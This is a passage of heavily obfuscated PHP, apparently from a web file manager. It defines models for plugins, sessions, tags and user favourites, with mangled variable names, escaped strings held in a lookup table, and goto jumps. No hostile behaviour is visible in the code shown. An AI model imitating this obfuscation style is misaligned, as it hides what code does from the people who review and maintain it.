= $this->get($öè¤•›); if (!$¹ÍôÚÄ || !isset($¹ÍôÚÄ[$¬Şüö¿Ó[366]])) { return !1; } $é©ôô‰Ã = array_find_by_field($¹ÍôÚÄ[$¬Şüö¿Ó[366]], $¬Şüö¿Ó[394], $ÂÃ¢«›); return is_array($é©ôô‰Ã) ? $é©ôô‰Ã : !1; } public function listSource($™ÚœœÊ², $í¡šğŠ®) { $ˆ¬ªÇÕ  =& $_SERVER[ê‘³Æ±]; if ($í¡šğŠ® && !is_array($í¡šğŠ®)) { $í¡šğŠ® = array($í¡šğŠ®); } $È¯ğ¼ªµ = $this->listData($™ÚœœÊ²); $±ÉäÒ = array(); foreach ($È¯ğ¼ªµ as $–•·€Ü) { $¯©§È±÷ = $–•·€Ü[$ˆ¬ªÇÕ [78]]; if (!$¯©§È±÷) { continue; } if (!isset($±ÉäÒ[$¯©§È±÷])) { $±ÉäÒ[$¯©§È±÷] = array(); } $±ÉäÒ[$¯©§È±÷][] = $–•·€Ü[$ˆ¬ªÇÕ [420]]; } $ÓÇ¯ÀĞö = array(); foreach ($±ÉäÒ as $ùşá “Œ => $µ‘äşø ) { $„­û › = !0; if (!$í¡šğŠ®) { $ÓÇ¯ÀĞö[] = $ùşá “Œ; continue; } foreach ($í¡šğŠ® as $Ï†‘Ğò×) { if (!in_array($Ï†‘Ğò×, $µ‘äşø )) { $„­û › = !1; break; } } if ($„­û ›) { $ÓÇ¯ÀĞö[] = $ùşá “Œ; } } if (!$ÓÇ¯ÀĞö) { return array(); } $¦ßİæÀ = array($ˆ¬ªÇÕ [411] => array($ˆ¬ªÇÕ [412], $ÓÇ¯ÀĞö), $ˆ¬ªÇÕ [498] => $™ÚœœÊ², $ˆ¬ªÇÕ [405] => SourceModel::TYPE_GROUP); $†öúµ‚§ = Model($ˆ¬ªÇÕ [1314])->listSource($¦ßİæÀ); if (!$†öúµ‚§ || count($ÓÇ¯ÀĞö) == $†öúµ‚§[$ˆ¬ªÇÕ [363]][$ˆ¬ªÇÕ [364]]) { return $†öúµ‚§; } $ñ“øŒ¡† = array(); $¬Íš½‹Ğ = array_to_keyvalue($†öúµ‚§[$ˆ¬ªÇÕ [77]], $ˆ¬ªÇÕ [12], $ˆ¬ªÇÕ [396]); $ì”‚÷ÖÒ = array_to_keyvalue($†öúµ‚§[$ˆ¬ªÇÕ [76]], $ˆ¬ªÇÕ [12], $ˆ¬ªÇÕ [396]); $©ëÙç± = array_merge($ì”‚÷ÖÒ, $¬Íš½‹Ğ); foreach ($ÓÇ¯ÀĞö as $¯©§È±÷) { if (!in_array($¯©§È±÷, $©ëÙç±)) { $ñ“øŒ¡†[] = $¯©§È±÷; } } if ($ñ“øŒ¡†) { $this->removeBySource($™ÚœœÊ², $ñ“øŒ¡†); } return $†öúµ‚§; } protected function listData($ó­èıÙë) { $‰‚ë°Ø =& $_SERVER[ê‘³Æ±]; $§æë½¶£ = array($‰‚ë°Ø[1632] => 0, $‰‚ë°Ø[476] => array($‰‚ë°Ø[1921], 0), $‰‚ë°Ø[416] => $‰‚ë°Ø[1922] . $ó­èıÙë); $Ô–×Øš = $‰‚ë°Ø[1923]; $Ïñˆ‡õÍ = $this->field($Ô–×Øš)->where($§æë½¶£)->order($‰‚ë°Ø[1924])->select(); return $Ïñˆ‡õÍ ? $Ïñˆ‡õÍ : array(); } protected function addToTag($êËªŠôù, $ÒîÉ–»Â, $Á¢áÖ·Ã) { $…œÁÑ¤ =& $_SERVER[ê‘³Æ±]; if (!$this->getByTagID($êËªŠôù, $Á¢áÖ·Ã) || !$ÒîÉ–»Â) { return !1; } if (!Model($…œÁÑ¤[819])->pathInfo($ÒîÉ–»Â)) { return !1; } $ÊÏªï = array($…œÁÑ¤[1632] => 0, $…œÁÑ¤[476] => $Á¢áÖ·Ã, $…œÁÑ¤[415] => $ÒîÉ–»Â, $…œÁÑ¤[416] => $…œÁÑ¤[1925] . $êËªŠôù, $…œÁÑ¤[414] => $…œÁÑ¤[12], $…œÁÑ¤[1813] => 0); if ($this->where($ÊÏªï)->find()) { return !1; } return $this->add($ÊÏªï); } protected function removeFromTag($Ë¿‹£øˆ, $íÉ÷â¶Ä, $©ÌÂŠ—Õ) { $ëØ—ª¤À =& $_SERVER[ê‘³Æ±]; if (!$this->getByTagID($Ë¿‹£øˆ, $©ÌÂŠ—Õ) || !$íÉ÷â¶Ä) { return !1; } if (is_array($íÉ÷â¶Ä)) { $íÉ÷â¶Ä = array($ëØ—ª¤À[7], $íÉ÷â¶Ä); } $øÏº©–Ä = array($ëØ—ª¤À[1632] => 0, $ëØ—ª¤À[476] => $©ÌÂŠ—Õ, $ëØ—ª¤À[416] => $ëØ—ª¤À[1925] . $Ë¿‹£øˆ, $ëØ—ª¤À[415] => $íÉ÷â¶Ä); return $this->where($øÏº©–Ä)->delete(); } protected function removeByTag($ë¥¶¾ïÍ, $¯ˆ§–¹™) { $›ŒÁ¹Ì» =& $_SERVER[ê‘³Æ±]; if (!$this->getByTagID($ë¥¶¾ïÍ, $¯ˆ§–¹™)) { return !1; } $Šäıá·Ë = array($›ŒÁ¹Ì»[1632] => 0, $›ŒÁ¹Ì»[476] => $¯ˆ§–¹™, $›ŒÁ¹Ì»[416] => $›ŒÁ¹Ì»[1925] . $ë¥¶¾ïÍ); return $this->where($Šäıá·Ë)->delete(); } protected function removeBySource($¸¿—¾óé, $Ö‹ã÷½) { $ï¬¼™ğı =& $_SERVER[ê‘³Æ±]; if (!$¸¿—¾óé || !$Ö‹ã÷½) { return !1; } if (is_array($Ö‹ã÷½)) { $Ö‹ã÷½ = array($ï¬¼™ğı[7], $Ö‹ã÷½); } $÷¯Õ¾¼¡ = array($ï¬¼™ğı[1632] => 0, $ï¬¼™ğı[415] => $Ö‹ã÷½, $ï¬¼™ğı[476] => array($ï¬¼™ğı[1003], 0), $ï¬¼™ğı[416] => $ï¬¼™ğı[1925] . $¸¿—¾óé); return $this->where($÷¯Õ¾¼¡)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\160\154\165\147\151\x6e\114\x69\x73\x74"; public $field = array("\156\141\155\145", "\163\164\141\164\x75\x73", "\162\x65\x67\x69\145\x73\164", "\143\x6f\x6e\146\x69\147"); public function loadList($éÙ×ÖÄÍ = false) { $¢´·‹¡Ê = array_to_keyvalue($this->listData(), $_SERVER[ê‘³Æ±][32]); if ($éÙ×ÖÄÍ) { return $¢´·‹¡Ê[$éÙ×ÖÄÍ]; } return $¢´·‹¡Ê; } public function init() { $ÙŒ°ÏòÁ =& $_SERVER[ê‘³Æ±]; Hook::trigger($ÙŒ°ÏòÁ[1926]); $…Ì«™‹Ç = $this->loadPluginList(); foreach ($…Ì«™‹Ç as $ÀëÆ°ç³ => $ß¶À¼•İ) { $¤Åè“± = $this->appAllow($ÀëÆ°ç³, $ß¶À¼•İ); if (!$¤Åè“±) { continue; } foreach ($ß¶À¼•İ[$ÙŒ°ÏòÁ[1927]] as $×‚“¹Ü¸ => $¢Ïñë¡­) { Hook::bind($×‚“¹Ü¸, $¢Ïñë¡­); } } Hook::trigger($ÙŒ°ÏòÁ[1928]); Hook::trigger(ACTION); } public function appAllow($Î•ÄôƒÂ, $½á•Åòè, $ÓÓõäó = true) { $’ŸßÏğ“ =& $_SERVER[ê‘³Æ±]; $İËŠ‹å = PLUGIN_DIR . $Î•ÄôƒÂ . $’ŸßÏğ“[1929]; if (!is_array($½á•Åòè) || !is_array($½á•Åòè[$’ŸßÏğ“[1927]]) || $½á•Åòè[$’ŸßÏğ“[736]] != 1 || !is_file($İËŠ‹å)) { return !1; } if ($GLOBALS[$’ŸßÏğ“[496]] == 1) { return !0; } if ($ÓÓõäó && !Action($’ŸßÏğ“[1930])->checkAuth($Î•ÄôƒÂ)) { return !1; } return !0; } public function unInstall($áÂºÏ¤) { $«›ãö—Ğ =& $_SERVER[ê‘³Æ±]; $”Ãò­•½ = $this->loadList($áÂºÏ¤); if (file_exists(PLUGIN_DIR . $áÂºÏ¤)) { Hook::apply($áÂºÏ¤ . $«›ãö—Ğ[1931]); } $this->remove($”Ãò­•½[$«›ãö—Ğ[394]]); } public function changeStatus($ÎÕ¢Üçµ, $·Ê¯¦¥¬) { $ÔèÌ´¿ =& $_SERVER[ê‘³Æ±]; $áñŞÕ = $this->loadList($ÎÕ¢Üçµ); if ($·Ê¯¦¥¬) { Hook::apply($ÎÕ¢Üçµ . $ÔèÌ´¿[1932]); } $this->update($áñŞÕ[$ÔèÌ´¿[394]], array($ÔèÌ´¿[1933] => $·Ê¯¦¥¬)); } public function appRegist($åûÉ¥¯æ, $×‚­‰”ï) { $ÌæÑÚßÔ =& $_SERVER[ê‘³Æ±]; $é¬ŒÕô = $this->loadList($åûÉ¥¯æ); if ($é¬ŒÕô) { $this->update($é¬ŒÕô[$ÌæÑÚßÔ[394]], array($ÌæÑÚßÔ[1927] => $×‚­‰”ï)); } else { $âğÌºÄ = array($ÌæÑÚßÔ[32] => $åûÉ¥¯æ, $ÌæÑÚßÔ[1927] => $×‚­‰”ï, $ÌæÑÚßÔ[736] => 0, $ÌæÑÚßÔ[6] => $this->getConfigDefault($åûÉ¥¯æ)); $this->insert($âğÌºÄ); } } public function getConfigDefault($¶ï¾‰°ô) { $ü„¾Ñş¶ =& $_SERVER[ê‘³Æ±]; $ä‚¹ĞÂ = array(); $ÌñŸä¤ = $this->getPackageJson($¶ï¾‰°ô); if (!$ÌñŸä¤ && is_array($ÌñŸä¤[$ü„¾Ñş¶[1934]])) { return $ä‚¹ĞÂ; } foreach ($ÌñŸä¤[$ü„¾Ñş¶[1934]] as $”æ­“£ => $İğàÄù) { if (!isset($İğàÄù[$ü„¾Ñş¶[371]]) || isset($ä‚¹ĞÂ[$”æ­“£])) { continue; } $ä‚¹ĞÂ[$”æ­“£] = $İğàÄù[$ü„¾Ñş¶[371]]; } return $ä‚¹ĞÂ; } public function getPackageJson($“çê’) { return Hook::apply($“çê’ . $_SERVER[ê‘³Æ±][1935]); } public function getConfig($æöèÚèœ, $¹Ş¸û×› = false) { $òÍ‡Üµ =& $_SERVER[ê‘³Æ±]; $­¾»¡¡Ì = array(); $ÀÌÎƒ®’ = $this->loadList($æöèÚèœ); if ($ÀÌÎƒ®’ && is_array($ÀÌÎƒ®’[$òÍ‡Üµ[6]])) { $­¾»¡¡Ì = $ÀÌÎƒ®’[$òÍ‡Üµ[6]]; } if (!$­¾»¡¡Ì || $¹Ş¸û×›) { $­¾»¡¡Ì = $this->getConfigDefault($æöèÚèœ); } return $­¾»¡¡Ì; } public function setConfig($äı®×Ñ, $— ¤Ù“ = false) { $×ËóÓö =& $_SERVER[ê‘³Æ±]; $»‹Ê‰ä² = $this->loadList($äı®×Ñ); if (!$»‹Ê‰ä²) { return !1; } $Şêâàö = $»‹Ê‰ä²[$×ËóÓö[6]]; if ($— ¤Ù“ == !1) { $Şêâàö = array(); $— ¤Ù“ = $this->getConfigDefault($äı®×Ñ); } foreach ($— ¤Ù“ as $¤¦ÈÌİ§ => $øì‘†ğè) { $Şêâàö[$¤¦ÈÌİ§] = is_string($øì‘†ğè) ? trim($øì‘†ğè) : $øì‘†ğè; } $this->update($»‹Ê‰ä²[$×ËóÓö[394]], array($×ËóÓö[6] => $Şêâàö)); } public function viewList() { $È÷˜„„§ =& $_SERVER[ê‘³Æ±]; $æŸ´• = $this->loadList(); $this->pluginScan($æŸ´•); $æŸ´• = $this->loadPluginList(); $ä‹ƒ®—º = array(); foreach ($æŸ´• as $—­ÕİÕ => $ã¡ĞãÄ) { unset($ã¡ĞãÄ[$È÷˜„„§[1927]], $ã¡ĞãÄ[$È÷˜„„§[6]]); $…˜ö‹û = PLUGIN_DIR . $ã¡ĞãÄ[$È÷˜„„§[32]] . $È÷˜„„§[1929]; if (!is_file($…˜ö‹û)) { continue; } $÷Æşô€— = Hook::apply($ã¡ĞãÄ[$È÷˜„„§[32]] . $È÷˜„„§[1935]); if (is_array($÷Æşô€—)) { $ä‹ƒ®—º[$—­ÕİÕ] = array_merge($ã¡ĞãÄ, $÷Æşô€—); } } return $ä‹ƒ®—º; } private function loadPluginList() { $ñÖˆ¼ƒ =& $_SERVER[ê‘³Æ±]; $×“Éîî = $this->loadList(); if (strtolower(MOD) == $ñÖˆ¼ƒ[1936]) { return $×“Éîî; } $²Ì‹é¢ = Hook::trigger($ñÖˆ¼ƒ[1937], $×“Éîî); if ($×“Éîî && !$²Ì‹é¢) { die; } return $²Ì‹é¢ ? $²Ì‹é¢ : $×“Éîî; } private function pluginScan($†ùÌ‘) { $Åí¸Úí­ =& $_SERVER[ê‘³Æ±]; recursion_dir(PLUGIN_DIR, $÷ÂÌˆú†, $Ì¿‘´ôÎ, 0); foreach ($÷ÂÌˆú† as $ÇŒğ¹Îó) { $’î¦ï´µ = get_path_this($ÇŒğ¹Îó); if (isset($†ùÌ‘[$’î¦ï´µ]) || !file_exists($ÇŒğ¹Îó . $Åí¸Úí­[1938]) || !file_exists($ÇŒğ¹Îó . $Åí¸Úí­[1929])) { continue; } Hook::apply($’î¦ï´µ . $Åí¸Úí­[1932]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\155\x5f\163\x65\x73\163\151\x6f\156"; public function get($Èà±ëğ“) { $Óµ±ïçŒ =& $_SERVER[ê‘³Æ±]; $¾Ç…Šƒ¥ = $this->where(array($Óµ±ïçŒ[1939] => $Èà±ëğ“))->find(); if (!is_array($¾Ç…Šƒ¥)) { return !1; } return $¾Ç…Šƒ¥[$Óµ±ïçŒ[741]]; } public function set($¶÷ÔÖš‚, $¿«œÈæÂ, $ëçêÊÃè = 3600) { $Ôù•šèË =& $_SERVER[ê‘³Æ±]; $Ö¯¾æŠÉ = array($Ôù•šèË[1939] => $¶÷ÔÖš‚, $Ôù•šèË[1847] => $¿«œÈæÂ, $Ôù•šèË[1940] => $ëçêÊÃè + time()); if (Session::get($Ôù•šèË[1941])) { $Ö¯¾æŠÉ[$Ôù•šèË[1641]] = Session::get($Ôù•šèË[1941]); } else { $Ö¯¾æŠÉ[$Ôù•šèË[1641]] = 0; } if ($this->get($¶÷ÔÖš‚)) { return $this->where(array($Ôù•šèË[1939] => $¶÷ÔÖš‚))->save($Ö¯¾æŠÉ); } else { return $this->add($Ö¯¾æŠÉ, array(), !0); } } public function remove($ÜÛ†°õ) { return $this->where(array($_SERVER[ê‘³Æ±][1939] => $ÜÛ†°õ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ê‘³Æ±][1942] . time())->delete(); } } goto AÓ¯õ“§÷à; A—Ï´Œöèå: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($Ç´æÚı) { $ú˜ç­€‡ =& $_SERVER[ê‘³Æ±]; return array($ú˜ç­€‡[1917] => array(USER_ID, $ú˜ç­€‡[1918])); } protected function listData() { $ƒâ­¡‹ç =& $_SERVER[ê‘³Æ±]; $¡Î¯İÕ¡ = array($ƒâ­¡‹ç[1632] => USER_ID, $ƒâ­¡‹ç[476] => array($ƒâ­¡‹ç[1921], 0)); $î½¢Ùñ = $ƒâ­¡‹ç[1923]; $ãçÜä‰ = $this->field($î½¢Ùñ)->where($¡Î¯İÕ¡)->order($ƒâ­¡‹ç[1924])->select(); return $ãçÜä‰ ? $ãçÜä‰ : array(); } protected function listByTag($şª™Êòİ) { } protected function addToTag($¤ôâÊª•, $Á„¹…¯¿) { $§¯î˜áâ =& $_SERVER[ê‘³Æ±]; if (!Model($§¯î˜áâ[2058])->listData($Á„¹…¯¿) || !Model($§¯î˜áâ[819])->pathInfo($¤ôâÊª•)) { return !1; } $‰†¼×¿‰ = array($§¯î˜áâ[1632] => USER_ID, $§¯î˜áâ[476] => $Á„¹…¯¿, $§¯î˜áâ[415] => $¤ôâÊª•, $§¯î˜áâ[416] => $§¯î˜áâ[410], $§¯î˜áâ[414] => $§¯î˜áâ[12], $§¯î˜áâ[1813] => 0); if ($this->where($‰†¼×¿‰)->find()) { return !1; } return $this->add($‰†¼×¿‰); } protected function removeFromTag($Ñï‚®ùé, $ìş¨Á­˜) { $¹›Ğ×½Ì =& $_SERVER[ê‘³Æ±]; if (!Model($¹›Ğ×½Ì[2058])->listData($ìş¨Á­˜)) { return !1; } if (is_array($Ñï‚®ùé)) { $Ñï‚®ùé = array($¹›Ğ×½Ì[7], $Ñï‚®ùé); } $¥ÓŠ½øâ = array($¹›Ğ×½Ì[1632] => USER_ID, $¹›Ğ×½Ì[476] => $ìş¨Á­˜, $¹›Ğ×½Ì[416] => $¹›Ğ×½Ì[410], $¹›Ğ×½Ì[415] => $Ñï‚®ùé); return $this->where($¥ÓŠ½øâ)->delete(); } protected function removeByTag($ÌàÑ¬Ÿ°) { $¹ìãÊâ =& $_SERVER[ê‘³Æ±]; if (!$ÌàÑ¬Ÿ°) { return !1; } $¢œœ©Ï‚ = array($¹ìãÊâ[1632] => USER_ID, $¹ìãÊâ[476] => $ÌàÑ¬Ÿ°); return $this->where($¢œœ©Ï‚)->delete(); } protected function removeBySource($¶“¯ŞŒ) { $œ¬Æô¹ =& $_SERVER[ê‘³Æ±]; if (is_array($¶“¯ŞŒ)) { $¶“¯ŞŒ = array($œ¬Æô¹[7], $¶“¯ŞŒ); } $Í…Ó²îô = array($œ¬Æô¹[1632] => USER_ID, $œ¬Æô¹[415] => $¶“¯ŞŒ, $œ¬Æô¹[476] => array($œ¬Æô¹[1003], 0)); return $this->where($Í…Ó²îô)->delete(); } }